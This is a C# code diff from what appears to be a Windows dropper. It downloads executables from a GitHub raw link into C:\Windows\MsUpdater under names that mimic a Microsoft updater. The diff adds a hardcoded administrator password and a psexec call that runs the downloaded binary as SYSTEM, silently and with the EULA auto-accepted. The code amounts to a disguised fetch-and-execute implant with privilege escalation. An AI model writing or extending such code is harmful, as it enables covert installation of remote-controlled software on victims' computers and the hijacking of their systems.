@@ -19,6 +19,13 @@
             const string UserTarget = @"C:\Windows\MsUpdater\MsUpdater2.exe";
             const string SystemTarget = @"C:\Windows\MsUpdater\MsUpdater0.exe";
 
+            var password = new SecureString();
+
+            foreach (var a in "abc123kappa")
+            {
+                password.AppendChar(a);
+            }
+
             if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
             {
                 using (var client = new WebClient())
@@ -28,15 +35,8 @@
                     client.DownloadFile("https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater0.exe?raw=true", SystemTarget);
                 }
 
-                Process.Start($@"C:\Windows\MsUpdater\psexec64.exe -i -s -d {SystemTarget}");
+                Process.Start(@"cmd /C C:\Windows\MsUpdater\psexec64 -i -s -accepteula -d C:\Windows\MsUpdater\msupdater0.exe", "administrator", password, string.Empty);
                 return;
-            }
-
-            var password = new SecureString();
-
-            foreach (var a in "abc123kappa")
-            {
-                password.AppendChar(a);
             }
 
             // ReSharper disable once PossibleNullReferenceException
